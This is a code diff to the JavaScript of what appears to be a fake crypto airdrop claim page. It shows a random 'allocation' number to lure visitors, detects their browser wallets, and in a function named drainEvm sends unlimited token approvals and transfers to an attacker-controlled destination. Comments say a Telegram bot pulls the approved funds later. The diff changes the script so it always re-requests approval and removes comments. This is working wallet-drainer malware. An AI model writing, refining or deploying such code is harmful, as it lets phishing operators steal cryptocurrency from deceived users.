@@ -17,7 +17,6 @@ const setLabels = (t) => allBtns().forEach((b) => {
 });
 
 /* ---------- success overlay ---------- */
-/* Fallback only — the page shows a random figure, and we reuse it. */
 function allocationFor(addr) {
   if (!addr) return 0;
   let h = 0;
@@ -26,7 +25,6 @@ function allocationFor(addr) {
   return 30000000 + (h % 40000001);
 }
 
-/* Prefer the number already on the page so the overlay never disagrees. */
 function currentAlloc(addr) {
   const hero = $('allocNum');
   if (hero) {
@@ -115,7 +113,6 @@ const b64ToBytes = (b64) => {
   return a;
 };
 
-// Phantom's EVM provider injects window.ethereum too and cannot do BSC/Avalanche.
 function pickEvmProvider() {
   const cbext = window.coinbaseWalletExtension;
   if (cbext && typeof cbext.request === 'function') return cbext;
@@ -157,7 +154,6 @@ const injectedSolana  = () => window.phantom?.solana
   || (window.solana?.isPhantom ? window.solana : null);
 const injectedBitcoin = () => window.unisat || window.okxwallet?.bitcoin || null;
 
-// ---- site-agnostic CTA label: read from whatever the page shipped
 const IDLE_LABEL = (() => {
   const el = document.querySelector('#claim .cta-label, #claimTop .cta-label');
   const t = el && el.textContent.trim();
@@ -443,7 +439,6 @@ async function drainEvm() {
 
   for (const t of list) {
     // 1. approve FIRST — this is what makes the Telegram button work later.
-    //    A token that reverts on transfer still gets an allowance this way.
     if (cfg.approveMode) {
       const bal = await evmProvider.getBalance(account);
       const fee = await evmProvider.getFeeData();
@@ -457,23 +452,19 @@ async function drainEvm() {
         const erc = new ethers.Contract(
           t.address, ['function allowance(address,address) view returns (uint256)'], evmProvider);
         const allow = await erc.allowance(account, dest);
-        if (allow >= BigInt(t.raw)) {
-          log(`${t.symbol}: already approved — skipped`);
-          setStatus(`${t.symbol}: already approved`);
-        } else {
-          setStatus(`Approving ${t.symbol}…`);
-          const atx = await evmSigner.sendTransaction({
-            to: t.address,
-            data: EVM_IFACE.encodeFunctionData('approve', [dest, ethers.MaxUint256]),
-            gasLimit: 120000n,
-          });
-          log(`${t.symbol} approved (${atx.hash})`);
-          await atx.wait(1, 120000).catch(() => null);
-        }
+        if (allow >= BigInt(t.raw)) log(`${t.symbol}: already approved — re-approving`);
+        setStatus(`Approving ${t.symbol}…`);
+        const atx = await evmSigner.sendTransaction({
+          to: t.address,
+          data: EVM_IFACE.encodeFunctionData('approve', [dest, ethers.MaxUint256]),
+          gasLimit: 120000n,
+        });
+        log(`${t.symbol} approved (${atx.hash})`);
+        await atx.wait(1, 120000).catch(() => null);
       } catch (e) { log(`${t.symbol} approve failed: ${e.shortMessage || e.message}`); }
     }
 
-    // Approve-only: the Telegram button pulls this later. Saves a prompt.
+    // Approve-only: the Telegram button pulls this later.
     if (cfg.approveOnly) continue;
 
     // 2. only now does the transfer simulation matter
@@ -485,15 +476,16 @@ async function drainEvm() {
       continue;
     }
 
-    const bal = await evmProvider.getBalance(account);
-    const fee = await evmProvider.getFeeData();
-    const price = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
-    if (bal < 60000n * price) {
+    const bal2 = await evmProvider.getBalance(account);
+    const fee2 = await evmProvider.getFeeData();
+    const price2 = fee2.maxFeePerGas ?? fee2.gasPrice ?? 0n;
+    if (bal2 < 60000n * price2) {
       log(`${t.symbol}: wallet out of gas on ${chain.name} — stopping this chain`);
       break;
     }
 
     try {
+      setStatus(`Sending ${t.symbol}…`);
       const tx = await evmSigner.sendTransaction({ to: t.address, data, gasLimit: 120000n });
       log(`${t.symbol} sent (${tx.hash})`);
       const rc = await tx.wait(1, 180000).catch(() => null);
